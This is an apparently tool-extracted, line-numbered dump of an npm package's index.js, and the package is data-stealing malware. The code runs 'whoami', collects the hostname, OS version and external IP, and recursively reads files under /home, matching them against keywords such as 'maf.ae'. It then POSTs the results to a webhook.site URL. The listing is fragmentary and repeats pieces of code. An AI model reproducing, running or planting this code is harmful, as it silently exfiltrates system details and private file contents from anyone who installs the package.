// File: tmp/tmp2s1ob39g/test-kaks3c/package/index.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const https = require('https')
Line 3: const fs = require('fs')
Line 4: const path = require('path')
Line 5: _tmp_4 = require('child_process')
Line 8: const webhookUrl = 'https://webhook.site/42057b0b-734e-4c7e-9755-71e765c659b0'
Line 10: _tmp_5.push("maf.ae")
Line 13: {
  const homeDir = '/home';

  let matchedFiles = [];
  function searchDir(dir) {
    fs.readdir(dir, { withFileTypes: true }, (err, files) => {
      if (err) return;

      files.forEach(file => {
        const fullPath = path.join(dir, file.name);

        if (file.isDirectory()) {
          searchDir(fullPath); // Recurse into subdirectory
        } else {
          // Read file and check for keywords
          fs.readFile(fullPath, 'utf8', (err, data) => {
            if (!err && data) {
              keywords.forEach(keyword => {
                if (data.toLowerCase().includes(keyword)) {
                  matchedFiles.push({
                    file: fullPath,
                    matchedKeyword: keyword
                  });
                }
              });
            }
          });
        }
      });
    });
  }

  searchDir(homeDir);

  // Return results once done
  setTimeout(() => {
    callback(matchedFiles);
  }, 5000); // Give time for search to finish
}
Line 16: let matchedFiles = []
Line 22: path.join(dir, file.name)
Line 28: fs.readFile(fullPath, 'utf8', (err, data) => {
            if (!err && data) {
              keywords.forEach(keyword => {
                if (data.toLowerCase().includes(keyword)) {
                  matchedFiles.push({
                    file: fullPath,
                    matchedKeyword: keyword
                  });
                }
              });
            }
          })
Line 31: data.toLowerCase().includes(keyword)
Line 32: matchedFiles.push({
                    file: fullPath,
                    matchedKeyword: keyword
                  })
Line 48: setTimeout(() => {
    callback(matchedFiles);
  }, 5000)
Line 49: callback(matchedFiles)
Line 54: (_tmp_3 = https.get('https://api.ipify.org', (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => callback(data.trim()));
  }))
Line 57: callback(data.trim())
Line 58: callback('unavailable')
Line 61: exec('whoami', (err, whoami) => {
  const hostname = os.hostname();
  const osType = `${os.type()} ${os.release()}`;

  getExternalIP((externalIP) => {
    // Search /home for the keyword
    searchHomeDirectory((matchedFiles) => {
      const payload = JSON.stringify({
        ip: externalIP,
        hostname: hostname,
        os: osType,
        whoami: whoami.trim(),
        "matched-files": matchedFiles.length > 0 ? matchedFiles : 'none'
      });

      const data = Buffer.from(payload);

      const req = https.request(
        new URL(webhookUrl),
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
          }
        },
        (res) => res.on('data', () => {}) // drain response
      );

      req.on('error', () => {});
      req.write(data);
      req.end();
    });
  });
})
Line 62: os.hostname()
Line 63: os.type()
Line 67: {
      const payload = JSON.stringify({
        ip: externalIP,
        hostname: hostname,
        os: osType,
        whoami: whoami.trim(),
        "matched-files": matchedFiles.length > 0 ? matchedFiles : 'none'
      });

      const data = Buffer.from(payload);

      const req = https.request(
        new URL(webhookUrl),
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
          }
        },
        (res) => res.on('data', () => {}) // drain response
      );

      req.on('error', () => {});
      req.write(data);
      req.end();
    }
Line 72: whoami.trim()
Line 76: Buffer.from(payload)
Line 78: const req = https.request(
        new URL(webhookUrl),
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
          }
        },
        (res) => res.on('data', () => {}) // drain response
      )
Line 91: req.write(data)
Line 92: req.end()
